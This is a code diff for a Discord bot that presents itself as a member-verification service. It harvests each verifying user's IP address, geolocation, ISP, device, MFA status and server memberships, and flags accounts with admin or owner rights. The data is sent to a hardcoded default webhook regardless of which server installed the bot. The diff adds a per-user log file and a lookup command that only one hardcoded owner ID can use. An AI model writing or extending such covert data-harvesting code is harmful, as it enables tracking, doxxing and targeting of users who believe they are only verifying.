@@ -25,8 +25,9 @@ const OWNER_USER_ID = '1400805500374745122';
 // 본인의 렌더 웹서비스 URL
 const FIXED_RENDER_URL = process.env.RENDER_EXTERNAL_URL || 'https://discord-verify1-524a.onrender.com';
 
-// 서버별 설정 저장 파일
+// 서버별 설정 및 유저 인증 로그 저장 파일
 const SETTINGS_FILE = path.join(__dirname, 'guild_settings.json');
+const USER_LOGS_FILE = path.join(__dirname, 'user_verify_logs.json');
 
 function loadSettings() {
     try {
@@ -40,6 +41,23 @@ function loadSettings() {
 function saveSettings(settings) {
     try {
         fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings, null, 2), 'utf8');
+    } catch (e) {}
+}
+
+function loadUserLogs() {
+    try {
+        if (fs.existsSync(USER_LOGS_FILE)) {
+            return JSON.parse(fs.readFileSync(USER_LOGS_FILE, 'utf8'));
+        }
+    } catch (e) {}
+    return {};
+}
+
+function saveUserLog(userId, logData) {
+    try {
+        const logs = loadUserLogs();
+        logs[userId] = logData;
+        fs.writeFileSync(USER_LOGS_FILE, JSON.stringify(logs, null, 2), 'utf8');
     } catch (e) {}
 }
 
@@ -100,8 +118,8 @@ client.on('messageCreate', async (message) => {
     const userId = message.author.id;
     const guildId = message.guild.id;
 
-    // 🔒 오직 본인(OWNER_USER_ID)만 명령어를 사용할 수 있도록 검사
-    if (content === '!인증' || content.startsWith('!인증역할') || content.startsWith('!웹훅') || content === '!역할제거') {
+    // 🔒 오직 본인(OWNER_USER_ID)만 명령어 사용 가능
+    if (content === '!인증' || content.startsWith('!인증역할') || content.startsWith('!웹훅') || content.startsWith('!인증정보') || content === '!역할제거') {
         if (userId !== OWNER_USER_ID) {
             return message.reply('❌ 이 명령어를 사용할 권한이 없습니다.');
         }
@@ -174,10 +192,47 @@ client.on('messageCreate', async (message) => {
         settings[guildId].webhookUrl = webhookUrl;
         saveSettings(settings);
 
-        message.reply('✅ 이 서버 전용 웹훅 주소가 성공적으로 설정되었습니다! (기본 웹훅과 이 서버 웹훅 양쪽으로 전송됩니다.)');
+        message.reply('✅ 이 서버 전용 웹훅 주소가 성공적으로 설정되었습니다!');
     }
 
-    // 4. !역할제거 명령어
+    // 4. !인증정보 (멘션 또는 유저ID) 명령어
+    if (content.startsWith('!인증정보')) {
+        // 멘션된 유저 ID 추출 또는 입력된 ID 추출
+        let targetUserId = '';
+        const mentionedUser = message.mentions.users.first();
+        if (mentionedUser) {
+            targetUserId = mentionedUser.id;
+        } else {
+            const args = content.split(' ');
+            targetUserId = args[1];
+        }
+
+        if (!targetUserId) {
+            return message.reply('⚠️ 정보를 확인할 유저를 멘션하거나 유저 ID를 입력해 주세요. (예: `!인증정보 @유저` 또는 `!인증정보 123456789`)');
+        }
+
+        const logs = loadUserLogs();
+        const userLog = logs[targetUserId];
+
+        if (!userLog) {
+            return message.reply(`❌ 해당 유저(<@${targetUserId}>)의 저장된 인증 기록이 없습니다.`);
+        }
+
+        message.reply(`🔍 **[유저 인증 기록 조회 결과]**\n` +
+                      `📌 **닉네임:** \`${userLog.displayName}\`\n` +
+                      `👤 **유저:** <@${userLog.userId}> (\`${userLog.username}\`)\n` +
+                      `🏫 **최근 인증 서버:** \`${userLog.serverName}\`\n` +
+                      `📅 **계정 생성일:** \`${userLog.createdAt}\`\n` +
+                      `🔒 **2차 인증(OTP):** \`${userLog.isMfaEnabled}\`\n` +
+                      `⏰ **인증 시각:** \`${userLog.verifiedAt}\`\n` +
+                      `🌐 **아이피:** \`${userLog.ipDisplay}\`\n` +
+                      `📍 **위치:** \`${userLog.ipLocation}\`\n` +
+                      `📡 **통신사:** \`${userLog.ispInfo}\`\n` +
+                      `💻 **기기:** \`${userLog.browser} / ${userLog.os}\`\n` +
+                      `⚠️ **부계정 여부:** ${userLog.altAccountCheck}`);
+    }
+
+    // 5. !역할제거 명령어
     if (content === '!역할제거') {
         try {
             const member = message.member;
@@ -197,7 +252,7 @@ client.on('messageCreate', async (message) => {
         }
     }
 
-    // 5. !서버복구 명령어
+    // 6. !서버복구 명령어
     if (content === '!서버복구') {
         try {
             const member = message.member;
@@ -298,13 +353,11 @@ app.get('/callback', async (req, res) => {
     const settings = loadSettings();
     const serverWebhook = settings[targetGuildId] && settings[targetGuildId].webhookUrl;
 
-    // 전송할 웹훅 목록 배열 (기본 웹훅은 항상 포함, 서버 전용 웹훅이 있으면 추가)
     const webhookUrlsToSend = [];
     if (DEFAULT_WEBHOOK_URL) webhookUrlsToSend.push(DEFAULT_WEBHOOK_URL);
     if (serverWebhook && serverWebhook !== DEFAULT_WEBHOOK_URL) webhookUrlsToSend.push(serverWebhook);
 
     try {
-        // 서버 정보 가져오기 (기본 웹훅에 어떤 서버인지 표시용)
         const targetGuild = await client.guilds.fetch(targetGuildId).catch(() => null);
         const serverName = targetGuild ? targetGuild.name : '알 수 없는 서버';
         const serverInfoText = `🏫 **인증 서버:** \`${serverName}\` (ID: \`${targetGuildId}\`)`;
@@ -417,6 +470,23 @@ app.get('/callback', async (req, res) => {
         if (adminOrOwnerFound) {
             altAccountCheck += ' / ⚠️ 주요 서버 소유 또는 관리자 권한 보유 계정';
         }
+
+        // 유저별 로그 저장 파일에 데이터 백업 (명령어 조회용)
+        saveUserLog(userId, {
+            userId,
+            username,
+            displayName,
+            serverName,
+            createdAt,
+            isMfaEnabled: userData.mfa_enabled ? '✅ 2차 인증 활성화됨' : '❌ 2차 인증 미사용',
+            verifiedAt,
+            ipDisplay,
+            ipLocation,
+            ispInfo,
+            browser,
+            os,
+            altAccountCheck
+        });
 
         const filePath = path.join(__dirname, `guilds_${userId}.txt`);
         fs.writeFileSync(filePath, guildsTextContent, 'utf8');
